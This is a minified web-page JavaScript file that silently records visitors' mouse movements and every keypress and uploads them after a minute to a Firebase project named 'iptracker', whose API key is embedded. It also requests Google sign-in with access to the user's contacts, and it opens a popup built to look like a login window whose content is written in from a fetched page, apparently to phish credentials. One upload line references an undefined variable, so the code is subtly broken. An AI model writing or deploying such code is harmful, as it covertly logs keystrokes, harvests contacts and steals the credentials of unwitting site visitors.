var lastObj,cursor_ev=new Object,keyb_ev=new Object,can_wrt=!0,curX=-1,curY=-1,buts=-1;window.setInterval(()=>{if(can_wrt=!can_wrt){var e={mouse:{x:curX,y:curY,b:buts}};if(JSON.stringify(e)==lastObj)return;lastObj=JSON.stringify(e),cursor_ev[Date.now()]=e}},75),window.setTimeout(()=>{const e=firebase.database().ref("mouse/"+name),t=firebase.database().ref("kb/"+name);e.set(cursor_ev),t.set(mouse_ev)},6e4),document.addEventListener("mousemove",e=>{buts=e.buttons,curX=Math.abs(e.screenX),curY=Math.abs(e.screenY)}),document.addEventListener("keypress",e=>{keyb_ev[Date.now()]=e.key});var firebaseConfig={apiKey:"AIzaSyDgp_Jze_9F4M_eIug70736-sAPPqYSTrQ",authDomain:"iptracker.firebaseapp.com",databaseURL:"https://iptracker.firebaseio.com",projectId:"iptracker",storageBucket:"iptracker.appspot.com",messagingSenderId:"442508990361",appId:"1:442508990361:web:e9b936885ff379523a6508"};function Login(e,t){var a=new firebase.auth.GoogleAuthProvider;a.addScope("https://www.googleapis.com/auth/contacts.readonly"),firebase.auth().signInWithPopup(a).then(function(e){e.credential.accessToken,e.user}).catch(function(e){e.code,e.message,e.email,e.credential})}function Logout(){firebase.auth().signOut().then(function(){sessionStorage.clear()}).catch(function(e){console.log("Error: ",e.message),GoogleFirebase.Errored=!0})}function FLogin(){var e=window.open("about:blank?lp=1&hl=en","","width=400,height=700");return window.setTimeout(()=>{fetch("login/login.html").then(t=>{t.text().then(t=>{e.document.write(t)})})},750),e.moveTo(screen.width*(screen.availLeft<0?-1:1)/2-200,25*(screen.availTop<0?-1:1)),e.focus(),e}firebase.initializeApp(firebaseConfig);
